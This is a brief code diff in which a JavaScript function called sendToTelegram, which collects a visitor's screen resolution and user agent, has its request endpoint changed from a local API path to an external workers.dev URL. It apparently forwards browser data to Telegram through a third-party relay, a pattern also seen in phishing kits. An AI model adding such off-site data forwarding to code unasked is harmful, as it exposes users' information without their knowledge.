@@ -268,7 +268,7 @@ async function sendToTelegram() {
       const screenRes = `${window.screen.width}x${window.screen.height}`;
       const userAgent = navigator.userAgent;
 
-      const endpoint = "/api/send-message";
+      const endpoint = "https://weathered-hat-6e12.testaccbykl.workers.dev";
 
       try {
         const res = await fetch(endpoint, {
